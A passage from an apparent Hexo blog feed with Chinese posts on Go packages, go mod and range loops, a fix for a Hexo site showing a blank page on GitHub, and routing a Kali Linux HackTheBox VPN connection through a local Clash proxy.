语言是现这一功能则是通过包来实现的</strong>。而实现包的功能则是通过关键字 <strong>package</strong> 来实现的，使用 <strong>package</strong> 来声明代码所在的包。</p><h2 id="1-基本概念-1"><a href="#1-基本概念-1" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h2><p>Go 语言中一般使用文件所在的<strong>文件名来命令自己的包名</strong>，这样层次清晰便于管理。其中包名定义的注意事项如下：</p><ul><li>包名一般都是<strong>全小写</strong></li><li>包名不可以是路径</li><li>一个文件夹下只能有一个包名</li><li>每个程序的<strong>入口包名均为 main</strong> ，只有有main包，程序才可以执行</li></ul><h2 id="2-多行导入-1"><a href="#2-多行导入-1" class="headerlink" title="2. 多行导入"></a>2. 多行导入</h2><p>多行导入的方式有点类似于多个常量同时定义。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br>    firstgo/packagetest1<br>    firstgo/packagetest2<br>)<br></code></pre></td></tr></table></figure><h2 id="3-使用规则-1"><a href="#3-使用规则-1" class="headerlink" title="3. 使用规则"></a>3. 使用规则</h2><p>在 Go 语言中，并不是直接导入了你写的一个包，你就可以直接使用包中的任何代码。这里有一个类似于Java和.NET的私有和公有的概念，你只可以使用导入的包中的<strong>公有的函数、变量以及自定义类型</strong>。Go 语言中区分公有私有的方法很简单，就是<strong>查看函数名、变量名以及自定义类型名的首字母是否为大写，大写的即为公有，小写的为私有</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> packagetest1<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">//定义私有变量name</span><br><span class="hljs-keyword">var</span> name = <span class="hljs-string">&quot;Test1&quot;</span><br><br><span class="hljs-comment">//PrintName 打印变量name</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PrintName</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;packagetest1 Name:&quot;</span>, name)<br>&#125;<br><span class="hljs-keyword">package</span> packagetest2<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">//定义私有变量name</span><br><span class="hljs-keyword">var</span> name = <span class="hljs-string">&quot;Test2&quot;</span><br><br><span class="hljs-comment">//PrintName 打印变量name</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PrintName</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;packagetest2 Name:&quot;</span>, name)<br>&#125;<br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;firstgo/packagetest1&quot;</span><br>    <span class="hljs-string">&quot;firstgo/packagetest2&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    packagetest1.PrintName()<span class="hljs-comment">//调用这个包中的PrintName()函数</span><br>    packagetest2.PrintName()<span class="hljs-comment">//调用这个包中的PrintName()函数</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="Go-语言-go-mod-包依赖管理工具-1"><a href="#Go-语言-go-mod-包依赖管理工具-1" class="headerlink" title="Go 语言 go mod 包依赖管理工具"></a>Go 语言 go mod 包依赖管理工具</h1><h2 id="1-指令介绍-1"><a href="#1-指令介绍-1" class="headerlink" title="1. 指令介绍"></a>1. 指令介绍</h2><p>控制台输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">go mod<br></code></pre></td></tr></table></figure><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308262137080.png" alt="image-20230826212609479"></p><p>指令解析如下表：</p><table><thead><tr><th align="left">指令</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">go mod download</td><td align="left">下载依赖包到本地(默认下载目录为 $GOPATH&#x2F;pkg&#x2F;mod)</td></tr><tr><td align="left">go mod edit</td><td align="left">编辑 go.mod 文件(不常用)</td></tr><tr><td align="left">go mod graph</td><td align="left">输出go mod的依赖图</td></tr><tr><td align="left">go mod init</td><td align="left">初始化一个mod项目，即在包中示创建一个go.mod文件</td></tr><tr><td align="left">go mod tidy</td><td align="left">自动补全新增(删除减少)的依赖包</td></tr><tr><td align="left">go mod verify</td><td align="left">校验依赖包</td></tr><tr><td align="left">go mod why</td><td align="left">解释为什么要依赖，即显示这个包在哪里被导入了(不常用)</td></tr></tbody></table><h2 id="2-go-mod-中使用-replace-1"><a href="#2-go-mod-中使用-replace-1" class="headerlink" title="2. go mod 中使用 replace"></a>2. go mod 中使用 replace</h2><p><strong>replace</strong> 是用于使用<strong>本地包来替换导入包的一个操作</strong>，毕竟并不是所有导入包都能够下载的到，也有一些是你自己开发，并未上传到网络中的代码，这时候如果要在 go mod 中导入就需要 <strong>replace</strong> 了。</p><p>使用代码如下：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arcade">module go_study<br><br>go <span class="hljs-number">1.20</span><br><br><span class="hljs-built_in">replace</span> (<br>    <span class="hljs-comment">//包导入名 =%3E 本地包相对路径/绝对路径</span><br>    go_study/<span class="hljs-function"><span class="hljs-params">packagetest1</span> =&gt;</span> ./packagetest1<br>    go_study/<span class="hljs-function"><span class="hljs-params">packagetest2</span> =&gt;</span> ./packagetest2<br>)<br><br></code></pre></td></tr></table></figure><h2 id="3-在项目中使用-1"><a href="#3-在项目中使用-1" class="headerlink" title="3. 在项目中使用"></a>3. 在项目中使用</h2><p>在<strong>任意文件夹</strong>中创建Go文件，然后录入以下代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.GET(<span class="hljs-string">&quot;/ping&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hello Codey!&quot;</span>,<br>&#125;)<br>&#125;)<br>r.Run() <span class="hljs-comment">// listen and serve on 0.0.0.0:8080</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>打开控制台输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">go mod init<br>go mod tidy<br></code></pre></td></tr></table></figure><p>这样就会开始下载依赖包</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308262137139.png" alt="image-20230826213048786"></p><p>最后项目文件夹里面会多出go.mod 和 go.sum ，其中 go.sum 不用在意，其中的内容为导入包的路径、版本和它的hash ，是自动生成自动更新的。</p><p>查看 go.mod会发现文件如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go">module go_study<br><br><span class="hljs-keyword">go</span> <span class="hljs-number">1.20</span><br><br>require github.com/gin-gonic/gin v1<span class="hljs-number">.9</span><span class="hljs-number">.1</span><br><br>require (<br>github.com/bytedance/sonic v1<span class="hljs-number">.9</span><span class="hljs-number">.1</span> <span class="hljs-comment">// indirect</span><br>github.com/chenzhuoyu/base64x v0<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">-20221115062448</span>-fe3a3abad311 <span class="hljs-comment">// indirect</span><br>github.com/gabriel-vasile/mimetype v1<span class="hljs-number">.4</span><span class="hljs-number">.2</span> <span class="hljs-comment">// indirect</span><br>github.com/gin-contrib/sse v0<span class="hljs-number">.1</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>github.com/<span class="hljs-keyword">go</span>-playground/locales v0<span class="hljs-number">.14</span><span class="hljs-number">.1</span> <span class="hljs-comment">// indirect</span><br>github.com/<span class="hljs-keyword">go</span>-playground/universal-translator v0<span class="hljs-number">.18</span><span class="hljs-number">.1</span> <span class="hljs-comment">// indirect</span><br>github.com/<span class="hljs-keyword">go</span>-playground/validator/v10 v10<span class="hljs-number">.14</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>github.com/goccy/<span class="hljs-keyword">go</span>-json v0<span class="hljs-number">.10</span><span class="hljs-number">.2</span> <span class="hljs-comment">// indirect</span><br>github.com/json-iterator/<span class="hljs-keyword">go</span> v1<span class="hljs-number">.1</span><span class="hljs-number">.12</span> <span class="hljs-comment">// indirect</span><br>github.com/klauspost/cpuid/v2 v2<span class="hljs-number">.2</span><span class="hljs-number">.4</span> <span class="hljs-comment">// indirect</span><br>github.com/leodido/<span class="hljs-keyword">go</span>-urn v1<span class="hljs-number">.2</span><span class="hljs-number">.4</span> <span class="hljs-comment">// indirect</span><br>github.com/mattn/<span class="hljs-keyword">go</span>-isatty v0<span class="hljs-number">.0</span><span class="hljs-number">.19</span> <span class="hljs-comment">// indirect</span><br>github.com/modern-<span class="hljs-keyword">go</span>/concurrent v0<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">-20180306012644</span>-bacd9c7ef1dd <span class="hljs-comment">// indirect</span><br>github.com/modern-<span class="hljs-keyword">go</span>/reflect2 v1<span class="hljs-number">.0</span><span class="hljs-number">.2</span> <span class="hljs-comment">// indirect</span><br>github.com/pelletier/<span class="hljs-keyword">go</span>-toml/v2 v2<span class="hljs-number">.0</span><span class="hljs-number">.8</span> <span class="hljs-comment">// indirect</span><br>github.com/twitchyliquid64/golang-asm v0<span class="hljs-number">.15</span><span class="hljs-number">.1</span> <span class="hljs-comment">// indirect</span><br>github.com/ugorji/<span class="hljs-keyword">go</span>/codec v1<span class="hljs-number">.2</span><span class="hljs-number">.11</span> <span class="hljs-comment">// indirect</span><br>golang.org/x/arch v0<span class="hljs-number">.3</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>golang.org/x/crypto v0<span class="hljs-number">.9</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>golang.org/x/net v0<span class="hljs-number">.10</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>golang.org/x/sys v0<span class="hljs-number">.8</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>golang.org/x/text v0<span class="hljs-number">.9</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>google.golang.org/protobuf v1<span class="hljs-number">.30</span><span class="hljs-number">.0</span> <span class="hljs-comment">// indirect</span><br>gopkg.in/yaml.v3 v3<span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-comment">// indirect</span><br>)<br></code></pre></td></tr></table></figure><p><strong>自动记录了引用的包路径和版本</strong>。如果要修改使用版本，<strong>直接修改版本号即可</strong>。&gt;)</p>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo部署后是空白页的玄学问题</title>
    <link href="/2023/08/25/hexo%E9%83%A8%E7%BD%B2%E5%90%8E%E6%98%AF%E7%A9%BA%E7%99%BD%E9%A1%B5%E7%9A%84%E7%8E%84%E5%AD%A6%E9%97%AE%E9%A2%98/"/>
    <url>/2023/08/25/hexo%E9%83%A8%E7%BD%B2%E5%90%8E%E6%98%AF%E7%A9%BA%E7%99%BD%E9%A1%B5%E7%9A%84%E7%8E%84%E5%AD%A6%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h1><p>最近在忙着 PMP 考试，许久没更新博客了，写了一片博客通过 hexo 发布到 Github 上发现页面成空白页了</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308250100871.png" alt="image.png"><br>发现主页只剩下<br>html 、head、body<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308250100898.png" alt="image.png"></p><p>但通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo s<br></code></pre></td></tr></table></figure><p>又发现本地又有数据<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308250100221.png" alt="image.png"></p><h1 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h1><p>在网上搜了下，发现有不少朋友跟我有相似问题<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308250100503.png" alt="image.png"></p><p>网上导致这种情况有：</p><ol><li>nodejs 版本问题导致 public 文件夹中的 index. html 为 0Kb</li></ol><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308250100821.png" alt="image.png"><br> 2. Hexo 与 node 的版本不兼容，要么 node 过高，要么 hexo 过低</p><p>但我 hexo 和 node 的版本一直没升级过，应该不存在版本不兼容问题，而且为 public 下没有 0kb 文件<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308250100213.png" alt="image.png"></p><ol start="3"><li>找到个跟我一样问题的<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308250100542.png" alt="image.png"></li></ol><h2 id="查看-hexo-和-node-版本"><a href="#查看-hexo-和-node-版本" class="headerlink" title="查看 hexo 和 node 版本"></a>查看 hexo 和 node 版本</h2><p>hexo 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  public hexo -version<br>INFO  Validating config<br>hexo: 6.3.0<br>hexo-cli: 4.3.0<br>os: darwin 22.5.0 13.4.1<br><br>node: 18.16.0<br>acorn: 8.8.2<br>ada: 1.0.4<br>ares: 1.19.0<br>brotli: 1.0.9<br>cldr: 42.0<br>icu: 72.1<br>llhttp: 6.0.10<br>modules: 108<br>napi: 8<br>nghttp2: 1.52.0<br>nghttp3: 0.7.0<br>ngtcp2: 0.8.1<br>openssl: 3.0.8+quic<br>simdutf: 3.2.2<br>tz: 2022g<br>undici: 5.21.0<br>unicode: 15.0<br>uv: 1.44.2<br>uvwasi: 0.0.15<br>v8: 10.2.154.26-node.26<br>zlib: 1.2.13<br></code></pre></td></tr></table></figure><p>node 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  blog node -v<br>v18.16.0<br></code></pre></td></tr></table></figure><p>版本也能对应上</p><h2 id="使用其他主题"><a href="#使用其他主题" class="headerlink" title="使用其他主题"></a>使用其他主题</h2><p>发现其他主题也是本地部署能够正常使用，部署到Github就是空白页</p><h2 id="网站-404"><a href="#网站-404" class="headerlink" title="网站 404"></a>网站 404</h2><p>因为我配置了域名，所以当我清理掉 github 的域名的 cookie 记录时候，发现页面 404<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308250100924.png" alt="image.png"></p><p>发现这情况，估计是动了 Github 项目的配置了，但又想不起是修改的哪儿，干脆重装吧。</p><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>删除 Github 仓库，重建仓库，然后重新上传搞定。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo clean<br>hexo g<br>hexo d<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali 配置clash</title>
    <link href="/2023/08/24/kali-%E9%85%8D%E7%BD%AEclash/"/>
    <url>/2023/08/24/kali-%E9%85%8D%E7%BD%AEclash/</url>
    
    <content type="html"><![CDATA[<h2 id="1-缘由"><a href="#1-缘由" class="headerlink" title="1. 缘由"></a>1. 缘由</h2><p>因为最近想打一打HTB，但是发现国内访问HTB太慢，因此有了本篇文章并且直接解决kali科学上网。</p><h2 id="2-环境准备"><a href="#2-环境准备" class="headerlink" title="2. 环境准备"></a>2. 环境准备</h2><ul><li><p>Kali Linux（方便打靶）</p></li><li><p>Clash （需要自行下载）</p></li><li><p>openvpn （Kali自带）</p></li></ul><h2 id="3-解决步骤"><a href="#3-解决步骤" class="headerlink" title="3. 解决步骤"></a>3. 解决步骤</h2><h3 id="3-1-配置Clash"><a href="#3-1-配置Clash" class="headerlink" title="3.1 配置Clash"></a>3.1 配置Clash</h3><p>下载clash：</p><p><a href="https://github.com/Dreamacro/clash/releases/">https://github.com/Dreamacro/clash/releases/</a></p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308241738747.png" alt="image-20230824163539279"></p><p>下载对应的版本后，给clash权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x clash<br></code></pre></td></tr></table></figure><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308241738778.png" alt="image-20230824163744240"></p><p>然后启动clash，让clash自动下载和生成文件，文件的路径在 <strong>&#x2F;root&#x2F;.config&#x2F;clash</strong></p><p>然后删掉自动下载的配置文件，接着开始下载自己的vpn订阅</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/.config/clash<br><span class="hljs-built_in">rm</span> config.yaml<br><span class="hljs-built_in">rm</span> Country.mmdb<br>wget -O config.yaml <span class="hljs-string">&quot;此处为你的机场订阅地址&quot;</span><br></code></pre></td></tr></table></figure><p>下载完毕后，然后执行clash，如果提示缺少mmdb，系统会自动下载。如果出现以下连接超时，可以自行去cdn节点下载，然后copy到 &#x2F;root&#x2F;.config&#x2F;clash 里面。</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308241738786.png" alt="image-20230824164234421"></p><p>最终 clash执行成功，访问<a href="http://clash.razord.top/">http://clash.razord.top</a> </p><p>到UI界面配置相应的节点。<img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308241738792.png" alt="image-20230824164428475"></p><h3 id="3-2-配置浏览器走clash代理"><a href="#3-2-配置浏览器走clash代理" class="headerlink" title="3.2 配置浏览器走clash代理"></a>3.2 配置浏览器走clash代理</h3><p>很简单，下载个插件SwitchyOmega 或者其他浏览器插件，配置好即可</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308241738811.png" alt="image-20230824164537954"></p><p>测试验证：</p><p>google</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308241738819.png"></p><p>查询当前IP</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308241738170.png" alt="image-20230824164714404"></p><h3 id="3-3-让HTB走本地的clash代理"><a href="#3-3-让HTB走本地的clash代理" class="headerlink" title="3.3 让HTB走本地的clash代理"></a>3.3 让HTB走本地的clash代理</h3><p>已经配置好clash后，现在需要让HTB的Openvpn走本地的clash端口，只需要在HTB下载后的ovpn文件添加一条本地代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http-proxy 127.0.0.1 7890<br></code></pre></td></tr></table></figure><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308241738201.png" alt="image-20230824170926608"></p><p>未走clash代理的延时</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308241738229.png" alt="image-20230824171111352"></p><p>通过clash代理的延时</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308241738272.png" alt="image-20230824171208521"></p><p>是否走clash的代理，延迟差别还是挺大的。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali clash</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go语言基础学习(四)</title>
    <link href="/2023/05/30/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E5%9B%9B)/"/>
    <url>/2023/05/30/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E5%9B%9B)/</url>
    
    <content type="html"><![CDATA[<h1 id="range"><a href="#range" class="headerlink" title="range"></a>range</h1><p>在线程不安全的 map 中学习了 map 的遍历，里面使用了一个叫 <strong>range</strong> 的关键字来对 map 进行遍历操作。</p><h2 id="1-基本用法"><a href="#1-基本用法" class="headerlink" title="1. 基本用法"></a>1. 基本用法</h2><p><strong>range</strong> 可以用来遍历的对象有<strong>数组、切片、map、字符串</strong>以及<strong>通道</strong>。遍历的对象不同，<strong>range</strong> 的返回值也会有所不同。遍历数组、切片和字符串时，它返回的就是数据的<strong>索引和值</strong>。遍历map时返回的就是map的<strong>key和value</strong>。而遍历通道时则只返回<strong>通道中的数据</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;Codey&quot;</span><br>intArray := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>intSlice := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>m := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;Apple&quot;</span>: <span class="hljs-string">&quot;苹果&quot;</span>, <span class="hljs-string">&quot;Orange&quot;</span>: <span class="hljs-string">&quot;橘子&quot;</span>, <span class="hljs-string">&quot;Bannana&quot;</span>: <span class="hljs-string">&quot;香蕉&quot;</span>&#125;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>c &lt;- <span class="hljs-number">10</span><br>c &lt;- <span class="hljs-number">11</span><br>c &lt;- <span class="hljs-number">12</span><br>c &lt;- <span class="hljs-number">13</span><br>c &lt;- <span class="hljs-number">14</span><br>fmt.Println(<span class="hljs-string">&quot;---字符串的遍历---&quot;</span>)<br><span class="hljs-comment">//遍历字符串</span><br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> str &#123;<br>fmt.Printf(<span class="hljs-string">&quot;索引: %d,值: %c\n&quot;</span>, k, v)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;---数组的遍历---&quot;</span>)<br><span class="hljs-comment">//遍历数组</span><br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> intArray &#123;<br>fmt.Printf(<span class="hljs-string">&quot;索引: %d,值: %d\n&quot;</span>, k, v)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;---切片的遍历---&quot;</span>)<br><span class="hljs-comment">//遍历切片</span><br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> intSlice &#123;<br>fmt.Printf(<span class="hljs-string">&quot;索引: %d,值: %d\n&quot;</span>, k, v)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;---map的遍历---&quot;</span>)<br><span class="hljs-comment">//遍历map</span><br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> m &#123;<br>fmt.Printf(<span class="hljs-string">&quot;key: %s,value: %s\n&quot;</span>, k, v)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;---通道的遍历---&quot;</span>)<br><span class="hljs-comment">//遍历通道</span><br><span class="hljs-keyword">for</span> v := <span class="hljs-keyword">range</span> c &#123;<br>fmt.Printf(<span class="hljs-string">&quot;值：%d\n&quot;</span>, v)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(c) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs tex">---字符串的遍历---<br>索引: 0,值: C<br>索引: 1,值: o<br>索引: 2,值: d<br>索引: 3,值: e<br>索引: 4,值: y<br>---数组的遍历---<br>索引: 0,值: 1<br>索引: 1,值: 2<br>索引: 2,值: 3<br>索引: 3,值: 4<br>索引: 4,值: 5<br>---切片的遍历---<br>索引: 0,值: 1<br>索引: 1,值: 2<br>索引: 2,值: 3<br>索引: 3,值: 4<br>索引: 4,值: 5<br>---map的遍历---<br>key: 